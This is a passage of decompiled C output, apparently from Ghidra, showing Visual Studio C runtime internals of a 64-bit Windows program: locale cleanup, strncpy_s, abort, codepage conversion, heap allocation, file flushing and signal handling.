    if ((undefined *)param_1[2] != PTR_DAT_14001b420) {
      FUN_14000b9c0((undefined *)param_1[2]);
    }
  }
  return;
}




/* Library Function - Single Match
    __free_lconv_mon
   
   Library: Visual Studio 2005 Release */

void __free_lconv_mon(longlong param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_14001b428) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_14001b430) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x28) != PTR_DAT_14001b438) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x28));
    }
    if (*(undefined **)(param_1 + 0x30) != PTR_DAT_14001b440) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x30));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_14001b448) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_14001b450) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_14001b458) {
      FUN_14000b9c0(*(undefined **)(param_1 + 0x48));
    }
  }
  return;
}




/* Library Function - Single Match
    strncpy_s
   
   Library: Visual Studio 2005 Release */

errno_t __cdecl strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  DWORD *pDVar2;
  rsize_t rVar3;
  char *pcVar4;
  char *pcVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
      goto LAB_140012711;
    }
  }
  else if (_Dst == (char *)0x0) goto LAB_140012711;
  if (_SizeInBytes != 0) {
    if (_MaxCount == 0) {
      *_Dst = '\0';
      return 0;
    }
    if (_Src != (char *)0x0) {
      rVar3 = _SizeInBytes;
      pcVar4 = _Dst;
      if (_MaxCount == 0xffffffffffffffff) {
        do {
          cVar1 = *_Src;
          _Src = _Src + 1;
          *pcVar4 = cVar1;
          if (cVar1 == '\0') break;
          rVar3 = rVar3 - 1;
          pcVar4 = pcVar4 + 1;
        } while (rVar3 != 0);
      }
      else {
        do {
          cVar1 = *_Src;
          pcVar5 = pcVar4 + 1;
          _Src = _Src + 1;
          *pcVar4 = cVar1;
          if ((cVar1 == '\0') || (rVar3 = rVar3 - 1, rVar3 == 0)) break;
          _MaxCount = _MaxCount - 1;
          pcVar4 = pcVar5;
        } while (_MaxCount != 0);
        if (_MaxCount == 0) {
          *pcVar5 = '\0';
        }
      }
      if (rVar3 != 0) {
        return 0;
      }
      if (_MaxCount == 0xffffffffffffffff) {
        _Dst[_SizeInBytes - 1] = '\0';
        return 0x50;
      }
      *_Dst = '\0';
      pDVar2 = FUN_140009c00();
      *pDVar2 = 0x22;
      FUN_1400072d0(0,0,0,0,0);
      return 0x22;
    }
    *_Dst = '\0';
  }
LAB_140012711:
  pDVar2 = FUN_140009c00();
  *pDVar2 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0x16;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ushort FUN_1400129a0(int param_1,ushort param_2,undefined8 *param_3)

{
  ushort uVar1;
  int iVar2;
  undefined6 extraout_var;
  uint uVar3;
  ushort local_res8 [4];
  CHAR local_res18;
  CHAR local_res19;
  undefined1 local_res1a;
  pthreadlocinfo local_28;
  pthreadmbcinfo local_20;
  DWORD *local_18;
  char local_10;
  
  local_10 = '\0';
  if (param_3 == (undefined8 *)0x0) {
    local_18 = FUN_14000b3d0();
    local_28 = *(pthreadlocinfo *)(local_18 + 0x30);
    local_20 = *(pthreadmbcinfo *)(local_18 + 0x2e);
    if ((local_28 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_28 = __updatetlocinfo();
    }
    if ((local_20 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_18[0x32]) == 0))
    {
      local_20 = __updatetmbcinfo();
    }
    if ((local_18[0x32] & 2) == 0) {
      local_18[0x32] = local_18[0x32] | 2;
      local_10 = '\x01';
    }
  }
  else {
    local_28 = (pthreadlocinfo)*param_3;
    local_20 = (pthreadmbcinfo)param_3[1];
  }
  if (param_1 + 1U < 0x101) {
    local_res8[0] = local_28->locale_name[3][param_1] & param_2;
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
      return local_res8[0];
    }
  }
  else {
    uVar1 = FUN_1400101b0(param_1 >> 8 & 0xff,&local_28);
    if ((int)CONCAT62(extraout_var,uVar1) == 0) {
      local_res19 = '\0';
      uVar3 = 1;
      local_res18 = (CHAR)param_1;
    }
    else {
      local_res1a = 0;
      uVar3 = 2;
      local_res18 = (CHAR)((uint)param_1 >> 8);
      local_res19 = (CHAR)param_1;
    }
    iVar2 = FUN_1400122a0((longlong *)&local_28,1,&local_res18,uVar3,local_res8,
                          local_28->lc_codepage,
                          *(LCID *)((longlong)&local_28->lc_category[0].locale + 4),1);
    if (iVar2 == 0) {
      if (local_10 != '\0') {
        local_18[0x32] = local_18[0x32] & 0xfffffffd;
      }
      return 0;
    }
    local_res8[0] = local_res8[0] & param_2;
    if (local_10 != '\0') {
      local_18[0x32] = local_18[0x32] & 0xfffffffd;
    }
  }
  return local_res8[0];
}




void FUN_140012b90(LCID param_1)

{
  int iVar1;
  undefined1 auStack_38 [32];
  byte local_18 [6];
  undefined1 local_12;
  ulonglong local_10;
  
  local_10 = DAT_14001a0b0 ^ (ulonglong)auStack_38;
  local_12 = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,(LPSTR)local_18,6);
  if (iVar1 == 0) {
    __security_check_cookie(local_10 ^ (ulonglong)auStack_38);
    return;
  }
  FUN_1400145b0(local_18);
  __security_check_cookie(local_10 ^ (ulonglong)auStack_38);
  return;
}




/* WARNING: Function: __chkstk replaced with injection: alloca_probe */

void FUN_140012c00(UINT param_1,UINT param_2,LPCSTR param_3,uint *param_4,longlong param_5,
                  undefined4 param_6)

{
  ulonglong uVar1;
  char cVar2;
  uint cbMultiByte;
  UINT CodePage;
  LPCSTR lpMultiByteStr;
  BOOL BVar3;
  int iVar4;
  uint uVar5;
  ulonglong uVar6;
  LPCWSTR lpWideCharStr;
  LPVOID pvVar7;
  longlong lVar8;
  undefined1 *puVar9;
  undefined1 *puVar10;
  undefined1 *puVar11;
  ulonglong uVar12;
  undefined1 auStackY_c8 [32];
  int local_88;
  UINT UStack_84;
  LPCSTR local_80;
  uint *local_78;
  _cpinfo local_70;
  ulonglong local_58;
  
  puVar9 = auStackY_c8;
  puVar10 = auStackY_c8;
  local_58 = DAT_14001a0b0 ^ (ulonglong)&local_88;
  cbMultiByte = *param_4;
  local_88 = 0;
  puVar11 = auStackY_c8;
  UStack_84 = param_1;
  local_80 = param_3;
  local_78 = param_4;
  if (param_1 == param_2) goto LAB_140012e66;
  BVar3 = GetCPInfo(param_1,&local_70);
  if ((((BVar3 == 0) || (local_70.MaxCharSize != 1)) ||
      (BVar3 = GetCPInfo(param_2,&local_70), BVar3 == 0)) || (local_70.MaxCharSize != 1)) {
    uVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    puVar11 = auStackY_c8;
    if (uVar5 == 0) goto LAB_140012e66;
  }
  else {
    local_88 = 1;
    uVar5 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      lVar8 = -1;
      do {
        if (lVar8 == 0) break;
        lVar8 = lVar8 + -1;
        cVar2 = *param_3;
        param_3 = param_3 + 1;
      } while (cVar2 != '\0');
      uVar5 = ~(uint)lVar8;
    }
  }
  puVar11 = auStackY_c8;
  if (((int)uVar5 < 1) ||
     (uVar12 = (ulonglong)(int)uVar5, puVar11 = auStackY_c8, 0x7ffffffffffffff0 < uVar12))
  goto LAB_140012e66;
  uVar1 = uVar12 * 2 + 0x10;
  if (uVar1 < 0x401) {
    uVar6 = uVar12 * 2 + 0x1f;
    if (uVar6 <= uVar1) {
      uVar6 = 0xffffffffffffff0;
    }
    lVar8 = -(uVar6 & 0xfffffffffffffff0);
    puVar9 = auStackY_c8 + lVar8;
    lpWideCharStr = (LPCWSTR)((longlong)&local_88 + lVar8);
    puVar11 = auStackY_c8 + lVar8;
    if (lpWideCharStr == (LPCWSTR)0x0) goto LAB_140012e66;
    lpWideCharStr[0] = L'쳌';
    lpWideCharStr[1] = L'\0';
LAB_140012d49:
    lpWideCharStr = lpWideCharStr + 8;
    puVar10 = puVar9;
  }
  else {
    lpWideCharStr = (LPCWSTR)FUN_14000dc10(uVar1);
    if (lpWideCharStr != (LPCWSTR)0x0) {
      lpWideCharStr[0] = L'\xdddd';
      lpWideCharStr[1] = L'\0';
      goto LAB_140012d49;
    }
  }
  puVar11 = puVar10;
  if (lpWideCharStr == (LPCWSTR)0x0) goto LAB_140012e66;
  *(undefined8 *)(puVar10 + -8) = 0x140012d61;
  FUN_140006070((ulonglong *)lpWideCharStr,0,uVar12 * 2);
  lpMultiByteStr = local_80;
  CodePage = UStack_84;
  *(uint *)(puVar10 + 0x28) = uVar5;
  *(LPCWSTR *)(puVar10 + 0x20) = lpWideCharStr;
  *(undefined8 *)(puVar10 + -8) = 0x140012d7f;
  iVar4 = MultiByteToWideChar(CodePage,1,lpMultiByteStr,cbMultiByte,*(LPWSTR *)(puVar10 + 0x20),
                              *(int *)(puVar10 + 0x28));
  if (iVar4 != 0) {
    if (param_5 == 0) {
      if (local_88 == 0) {
        *(undefined8 *)(puVar10 + 0x38) = 0;
        *(undefined8 *)(puVar10 + 0x30) = 0;
        *(undefined4 *)(puVar10 + 0x28) = 0;
        *(undefined8 *)(puVar10 + 0x20) = 0;
        *(undefined8 *)(puVar10 + -8) = 0x140012df5;
        uVar5 = WideCharToMultiByte(param_2,0,lpWideCharStr,uVar5,*(LPSTR *)(puVar10 + 0x20),
                                    *(int *)(puVar10 + 0x28),*(LPCSTR *)(puVar10 + 0x30),
                                    *(LPBOOL *)(puVar10 + 0x38));
        if (uVar5 == 0) goto LAB_140012e51;
      }
      *(undefined8 *)(puVar10 + -8) = 0x140012e08;
      pvVar7 = (LPVOID)FUN_14000f670(1,(longlong)(int)uVar5);
      if (pvVar7 != (LPVOID)0x0) {
        *(undefined8 *)(puVar10 + 0x38) = 0;
        *(undefined8 *)(puVar10 + 0x30) = 0;
        *(uint *)(puVar10 + 0x28) = uVar5;
        *(LPVOID *)(puVar10 + 0x20) = pvVar7;
        *(undefined8 *)(puVar10 + -8) = 0x140012e34;
        uVar5 = WideCharToMultiByte(param_2,0,lpWideCharStr,uVar5,*(LPSTR *)(puVar10 + 0x20),
                                    *(int *)(puVar10 + 0x28),*(LPCSTR *)(puVar10 + 0x30),
                                    *(LPBOOL *)(puVar10 + 0x38));
        if (uVar5 == 0) {
          *(undefined8 *)(puVar10 + -8) = 0x140012e40;
          FUN_14000b9c0(pvVar7);
        }
        else if (cbMultiByte != 0xffffffff) {
          *local_78 = uVar5;
        }
      }
    }
    else {
      *(undefined8 *)(puVar10 + 0x38) = 0;
      *(undefined8 *)(puVar10 + 0x30) = 0;
      *(undefined4 *)(puVar10 + 0x28) = param_6;
      *(longlong *)(puVar10 + 0x20) = param_5;
      *(undefined8 *)(puVar10 + -8) = 0x140012db8;
      WideCharToMultiByte(param_2,0,lpWideCharStr,uVar5,*(LPSTR *)(puVar10 + 0x20),
                          *(int *)(puVar10 + 0x28),*(LPCSTR *)(puVar10 + 0x30),
                          *(LPBOOL *)(puVar10 + 0x38));
    }
  }
LAB_140012e51:
  if (*(int *)(lpWideCharStr + -8) == 0xdddd) {
    *(undefined8 *)(puVar10 + -8) = 0x140012e63;
    FUN_14000b9c0(lpWideCharStr + -8);
  }
LAB_140012e66:
  uVar12 = local_58 ^ (ulonglong)&local_88;
  *(undefined8 *)(puVar11 + -8) = 0x140012e72;
  __security_check_cookie(uVar12);
  return;
}




bool FUN_140012ea0(longlong param_1)

{
  return param_1 != 0;
}




/* Library Function - Single Match
    abort
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release */

void __cdecl abort(void)

{
  code *pcVar1;
  longlong lVar2;
  _EXCEPTION_POINTERS local_588;
  EXCEPTION_RECORD local_578;
  _CONTEXT local_4d8;
  
  if ((DAT_14001b480 & 1) != 0) {
    FUN_14000e370(10);
  }
  lVar2 = FUN_140012fd0();
  if (lVar2 != 0) {
    FUN_140012fe0(0x16);
  }
  if ((DAT_14001b480 & 2) != 0) {
    RtlCaptureContext(&local_4d8);
    FUN_140006070((ulonglong *)&local_578,0,0x98);
    local_588.ExceptionRecord = &local_578;
    local_578.ExceptionCode = 0x40000015;
    local_588.ContextRecord = &local_4d8;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_588);
  }
  FUN_14000e2d0(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}




undefined8 FUN_140012f60(longlong param_1)

{
  DWORD *pDVar1;
  undefined8 uVar2;
  
  if (param_1 == 0) {
    pDVar1 = FUN_140009c00();
    *pDVar1 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffffffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x000140012fa5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = HeapSize(DAT_14001c0e0,0,param_1);
  return uVar2;
}




/* Library Function - Single Match
    _initp_misc_winsig
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release */

void _initp_misc_winsig(undefined8 param_1)

{
  DAT_14001c398 = param_1;
  DAT_14001c3a0 = param_1;
  DAT_14001c3a8 = param_1;
  DAT_14001c3b0 = param_1;
  return;
}




void FUN_140012fd0(void)

{
  FUN_14000b0e0(DAT_14001c3a8);
  return;
}




undefined8 FUN_140012fe0(DWORD param_1)

{
  DWORD *pDVar1;
  bool bVar2;
  code *pcVar3;
  DWORD *pDVar4;
  undefined8 uVar5;
  INT_PTR IVar6;
  DWORD *pDVar7;
  int iVar8;
  DWORD local_res8;
  undefined8 local_30;
  
  bVar2 = false;
  local_res8 = 0;
  switch(param_1) {
  case 2:
    pDVar7 = (DWORD *)&DAT_14001c398;
    IVar6 = DAT_14001c398;
    break;
  default:
    pDVar7 = FUN_140009c00();
    *pDVar7 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  case 4:
  case 8:
  case 0xb:
    pDVar4 = FUN_14000b340();
    if (pDVar4 == (DWORD *)0x0) {
      return 0xffffffff;
    }
    pDVar1 = *(DWORD **)(pDVar4 + 0x28);
    pDVar7 = pDVar1;
    do {
      if (pDVar7[1] == param_1) break;
      pDVar7 = pDVar7 + 4;
    } while (pDVar7 < pDVar1 + (longlong)DAT_14001af8c * 4);
    if ((pDVar1 + (longlong)DAT_14001af8c * 4 <= pDVar7) || (pDVar7[1] != param_1)) {
      pDVar7 = (DWORD *)0x0;
    }
    pDVar7 = pDVar7 + 2;
    pcVar3 = *(code **)pDVar7;
    goto LAB_1400130f9;
  case 6:
  case 0x16:
    pDVar7 = (DWORD *)&DAT_14001c3a8;
    IVar6 = DAT_14001c3a8;
    break;
  case 0xf:
    pDVar7 = (DWORD *)&DAT_14001c3b0;
    IVar6 = DAT_14001c3b0;
    break;
  case 0x15:
    pDVar7 = (DWORD *)&DAT_14001c3a0;
    IVar6 = DAT_14001c3a0;
  }
  local_res8 = 1;
  bVar2 = true;
  pcVar3 = (code *)FUN_14000b0e0(IVar6);
  pDVar4 = (DWORD *)0x0;
LAB_1400130f9:
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 != (code *)0x0) {
    if (bVar2) {
      _lock(0);
    }
    if (((param_1 == 8) || (param_1 == 0xb)) || (param_1 == 4)) {
      local_30 = *(undefined8 *)(pDVar4 + 0x2a);
      pDVar4[0x2a] = 0;
      pDVar4[0x2b] = 0;
      if (param_1 == 8) {
        local_res8 = pDVar4[0x2c];
        pDVar4[0x2c] = 0x8c;
      }
    }
    iVar8 = DAT_14001af80;
    if (param_1 == 8) {
      for (; iVar8 < DAT_14001af80 + DAT_14001af84; iVar8 = iVar8 + 1) {
        *(undefined8 *)(*(longlong *)(pDVar4 + 0x28) + 8 + (longlong)iVar8 * 0x10) = 0;
      }
    }
    else {
      IVar6 = FUN_14000aff0();
      *(INT_PTR *)pDVar7 = IVar6;
    }
    if (bVar2) {
      FUN_14000fc60(0);
    }
    if (param_1 == 8) {
      (*pcVar3)(8,pDVar4[0x2c]);
    }
    else {
      (*pcVar3)(param_1);
      if ((param_1 != 0xb) && (param_1 != 4)) {
        return 0;
      }
    }
    *(undefined8 *)(pDVar4 + 0x2a) = local_30;
    if (param_1 == 8) {
      pDVar4[0x2c] = local_res8;
    }
    return 0;
  }
  FUN_14000e2d0(3);
  pcVar3 = (code *)swi(3);
  uVar5 = (*pcVar3)();
  return uVar5;
}




void FUN_140013270(undefined8 param_1,longlong param_2)

{
  if (*(int *)(param_2 + 0x70) != 0) {
    FUN_14000fc60(0);
  }
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140013290(undefined8 param_1)

{
  _DAT_14001c3c0 = param_1;
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400132a0(undefined8 param_1)

{
  _DAT_14001c3d0 = param_1;
  return;
}




void FUN_1400132b0(undefined8 param_1)

{
  DAT_14001c3d8 = param_1;
  return;
}




undefined8 FUN_1400132c0(LPCRITICAL_SECTION param_1)

{
  InitializeCriticalSection(param_1);
  return 1;
}




ulonglong FUN_1400132e0(undefined8 param_1,ulonglong param_2)

{
  code *pcVar1;
  undefined8 uVar2;
  HMODULE hModule;
  ulonglong uVar3;
  int local_res18 [2];
  
  local_res18[0] = 0;
  pcVar1 = (code *)FUN_14000b0e0(DAT_14001c3d8);
  if (pcVar1 == (FARPROC)0x0) {
    uVar2 = _get_osplatform(local_res18);
    if ((int)uVar2 != 0) {
                    /* WARNING: Subroutine does not return */
      FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    if (local_res18[0] == 1) {
      pcVar1 = FUN_1400132c0;
    }
    else {
      hModule = GetModuleHandleA("kernel32.dll");
      if (hModule == (HMODULE)0x0) {
        pcVar1 = FUN_1400132c0;
      }
      else {
        pcVar1 = GetProcAddress(hModule,"InitializeCriticalSectionAndSpinCount");
        if (pcVar1 == (FARPROC)0x0) {
          pcVar1 = FUN_1400132c0;
        }
      }
    }
    DAT_14001c3d8 = FUN_14000af20((INT_PTR)pcVar1);
  }
  uVar3 = (*pcVar1)(param_1,param_2 & 0xffffffff);
  return uVar3 & 0xffffffff;
}




undefined8 FUN_140013400(undefined8 param_1,undefined8 param_2,uint param_3)

{
  int iVar1;
  INT_PTR IVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  undefined8 uVar4;
  code *pcVar5;
  code *pcVar6;
  longlong lVar7;
  longlong lVar8;
  int local_res20 [2];
  uint local_48 [4];
  byte local_38;
  
  IVar2 = FUN_14000aff0();
  lVar8 = 0;
  local_res20[0] = 0;
  local_48[0] = 0;
  if (DAT_14001c3e0 == 0) {
    hModule = LoadLibraryA("USER32.DLL");
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar3 = GetProcAddress(hModule,"MessageBoxA");
    if (pFVar3 == (FARPROC)0x0) {
      return 0;
    }
    DAT_14001c3e0 = FUN_14000af20((INT_PTR)pFVar3);
    pFVar3 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_14001c3e8 = FUN_14000af20((INT_PTR)pFVar3);
    pFVar3 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_14001c3f0 = FUN_14000af20((INT_PTR)pFVar3);
    uVar4 = _get_osplatform(local_res20);
    if ((int)uVar4 != 0) {
                    /* WARNING: Subroutine does not return */
      FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    if (local_res20[0] == 2) {
      pFVar3 = GetProcAddress(hModule,"GetUserObjectInformationA");
      DAT_14001c400 = FUN_14000af20((INT_PTR)pFVar3);
      if (DAT_14001c400 != 0) {
        pFVar3 = GetProcAddress(hModule,"GetProcessWindowStation");
        DAT_14001c3f8 = FUN_14000af20((INT_PTR)pFVar3);
      }
    }
  }
  if ((DAT_14001c3f8 != IVar2) && (DAT_14001c400 != IVar2)) {
    pcVar5 = (code *)FUN_14000b0e0(DAT_14001c3f8);
    pcVar6 = (code *)FUN_14000b0e0(DAT_14001c400);
    if (((pcVar5 != (code *)0x0) && (pcVar6 != (code *)0x0)) &&
       (((lVar7 = (*pcVar5)(), lVar7 == 0 || (iVar1 = (*pcVar6)(lVar7), iVar1 == 0)) ||
        ((local_38 & 1) == 0)))) {
      uVar4 = FUN_14000e060(local_48);
      if ((int)uVar4 != 0) {
                    /* WARNING: Subroutine does not return */
        FID_conflict__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      if (local_48[0] < 4) {
        param_3 = param_3 | 0x40000;
      }
      else {
        param_3 = param_3 | 0x200000;
      }
      goto LAB_140013616;
    }
  }
  if ((((DAT_14001c3e8 != IVar2) &&
       (pcVar5 = (code *)FUN_14000b0e0(DAT_14001c3e8), lVar8 = 0, pcVar5 != (code *)0x0)) &&
      (lVar8 = (*pcVar5)(), lVar8 != 0)) &&
     ((DAT_14001c3f0 != IVar2 &&
      (pcVar5 = (code *)FUN_14000b0e0(DAT_14001c3f0), pcVar5 != (code *)0x0)))) {
    lVar8 = (*pcVar5)(lVar8);
  }
LAB_140013616:
  pcVar5 = (code *)FUN_14000b0e0(DAT_14001c3e0);
  if (pcVar5 == (code *)0x0) {
    return 0;
  }
  uVar4 = (*pcVar5)(lVar8,param_1,param_2,param_3);
  return uVar4;
}




undefined4 FUN_140013660(int param_1)

{
  undefined4 uVar1;
  DWORD *pDVar2;
  
  uVar1 = DAT_14001b648;
  if (-1 < param_1) {
    if (param_1 < 3) {
      DAT_14001b648 = param_1;
      return uVar1;
    }
    if (param_1 == 3) {
      return DAT_14001b648;
    }
  }
  pDVar2 = FUN_140009c00();
  *pDVar2 = 0x16;
  FUN_1400072d0(0,0,0,0,0);
  return 0xffffffff;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

byte FUN_1400136c0(uint param_1)

{
  byte bVar1;
  DWORD *pDVar2;
  pthreadmbcinfo ptVar3;
  bool bVar4;
  
  pDVar2 = FUN_14000b3d0();
  ptVar3 = *(pthreadmbcinfo *)(pDVar2 + 0x2e);
  if ((*(undefined **)(pDVar2 + 0x30) != PTR_DAT_14001ad00) &&
     ((_DAT_14001ab88 & pDVar2[0x32]) == 0)) {
    __updatetlocinfo();
  }
  if ((ptVar3 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & pDVar2[0x32]) == 0)) {
    ptVar3 = __updatetmbcinfo();
  }
  bVar4 = (pDVar2[0x32] & 2) == 0;
  if (bVar4) {
    pDVar2[0x32] = pDVar2[0x32] | 2;
  }
  bVar1 = ptVar3->mbctype[(ulonglong)(param_1 & 0xff) + 5];
  if (bVar4) {
    pDVar2[0x32] = pDVar2[0x32] & 0xfffffffd;
  }
  return bVar1 >> 2 & 1;
}




LPVOID FUN_140013780(ulonglong param_1,ulonglong param_2,undefined4 *param_3)

{
  undefined1 auVar1 [16];
  int iVar2;
  DWORD *pDVar3;
  LPVOID pvVar4;
  ulonglong dwBytes;
  
  if ((param_1 != 0) &&
     (auVar1._8_8_ = 0, auVar1._0_8_ = param_1,
     SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffe0)) / auVar1,0) < param_2)) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 0xc;
    FUN_1400072d0(0,0,0,0,0);
    return (LPVOID)0x0;
  }
  dwBytes = param_2 * param_1;
  if (dwBytes == 0) {
    dwBytes = 1;
  }
  do {
    pvVar4 = (LPVOID)0x0;
    if ((dwBytes < 0xffffffffffffffe1) &&
       (pvVar4 = HeapAlloc(DAT_14001c0e0,8,dwBytes), pvVar4 != (LPVOID)0x0)) {
      return pvVar4;
    }
    if (DAT_14001c394 == 0) {
      if (param_3 != (undefined4 *)0x0) {
        *param_3 = 0xc;
      }
      return pvVar4;
    }
    iVar2 = _callnewh(dwBytes);
  } while (iVar2 != 0);
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = 0xc;
  }
  return (LPVOID)0x0;
}




LPVOID FUN_140013850(LPVOID param_1,size_t param_2)

{
  int iVar1;
  DWORD DVar2;
  LPVOID pvVar3;
  DWORD *pDVar4;
  
  if (param_1 == (LPVOID)0x0) {
    pvVar3 = FUN_14000dc10(param_2);
    return pvVar3;
  }
  if (param_2 == 0) {
    FUN_14000b9c0(param_1);
    return (LPVOID)0x0;
  }
  if (param_2 < 0xffffffffffffffe1) {
    do {
      if (param_2 == 0) {
        param_2 = 1;
      }
      pvVar3 = HeapReAlloc(DAT_14001c0e0,0,param_1,param_2);
      if (pvVar3 != (LPVOID)0x0) {
        return pvVar3;
      }
      if (DAT_14001c394 == 0) {
        pDVar4 = FUN_140009c00();
        DVar2 = GetLastError();
        DVar2 = FUN_140009bb0(DVar2);
        *pDVar4 = DVar2;
        return (LPVOID)0x0;
      }
      iVar1 = _callnewh(param_2);
      if (iVar1 == 0) {
        pDVar4 = FUN_140009c00();
        DVar2 = GetLastError();
        DVar2 = FUN_140009bb0(DVar2);
        *pDVar4 = DVar2;
        return (LPVOID)0x0;
      }
    } while (param_2 < 0xffffffffffffffe1);
  }
  _callnewh(param_2);
  pDVar4 = FUN_140009c00();
  *pDVar4 = 0xc;
  return (LPVOID)0x0;
}




undefined4 FUN_140013940(FILE *param_1)

{
  undefined4 uVar1;
  uint uVar2;
  DWORD *pDVar3;
  undefined8 uVar4;
  ulonglong uVar5;
  
  uVar1 = 0xffffffff;
  if (param_1 == (FILE *)0x0) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  }
  if ((param_1->_flag & 0x83) != 0) {
    uVar4 = FUN_14000f880((int *)param_1);
    uVar1 = (undefined4)uVar4;
    _freebuf(param_1);
    uVar2 = FUN_14000fe60((longlong)param_1);
    uVar5 = FUN_140014690(uVar2);
    if ((int)uVar5 < 0) {
      uVar1 = 0xffffffff;
    }
    else if (param_1->_tmpfname != (char *)0x0) {
      FUN_14000b9c0(param_1->_tmpfname);
      param_1->_tmpfname = (char *)0x0;
    }
  }
  param_1->_flag = 0;
  return uVar1;
}




undefined4 FUN_1400139e0(FILE *param_1)

{
  undefined4 uVar1;
  DWORD *pDVar2;
  
  uVar1 = 0xffffffff;
  if (param_1 == (FILE *)0x0) {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    uVar1 = 0xffffffff;
  }
  else if ((param_1->_flag & 0x40) == 0) {
    FUN_140008990((ulonglong)param_1);
    uVar1 = FUN_140013940(param_1);
    FUN_140008a40((ulonglong)param_1);
  }
  else {
    param_1->_flag = 0;
  }
  return uVar1;
}




void FUN_140013a60(undefined8 param_1,longlong param_2)

{
  FUN_140008a40(*(ulonglong *)(param_2 + 0x40));
  return;
}




DWORD FUN_140013a80(uint param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  DWORD *pDVar3;
  HANDLE hFile;
  
  if (param_1 == 0xfffffffe) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 9;
    return 0xffffffff;
  }
  if (((int)param_1 < 0) || (DAT_14001c4cc <= param_1)) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 9;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  }
  if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 9;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  }
  FUN_140014110(param_1);
  if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                (ulonglong)(param_1 & 0x1f) * 0x50) & 1) != 0) {
    hFile = (HANDLE)FUN_140014070(param_1);
    BVar1 = FlushFileBuffers(hFile);
    if (BVar1 != 0) {
      DVar2 = 0;
      goto LAB_140013b5c;
    }
    DVar2 = GetLastError();
    if (DVar2 == 0) goto LAB_140013b5c;
    pDVar3 = FUN_140009c30();
    *pDVar3 = DVar2;
  }
  pDVar3 = FUN_140009c00();
  *pDVar3 = 9;
  DVar2 = 0xffffffff;
LAB_140013b5c:
  FUN_1400141e0(param_1);
  return DVar2;
}




void FUN_140013ba0(undefined8 param_1,longlong param_2)

{
  FUN_1400141e0(*(uint *)(param_2 + 0x50));
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint FUN_140013bd0(longlong *param_1,byte *param_2,undefined8 *param_3,uint param_4,uint param_5)

{
  ushort uVar1;
  DWORD *pDVar2;
  undefined6 extraout_var;
  uint uVar3;
  int iVar4;
  byte *pbVar5;
  uint uVar6;
  byte bVar7;
  uint uVar8;
  pthreadlocinfo ptVar9;
  pthreadlocinfo local_38;
  pthreadmbcinfo local_30;
  DWORD *local_28;
  char local_20;
  
  local_20 = '\0';
  if (param_1 == (longlong *)0x0) {
    local_28 = FUN_14000b3d0();
    local_38 = *(pthreadlocinfo *)(local_28 + 0x30);
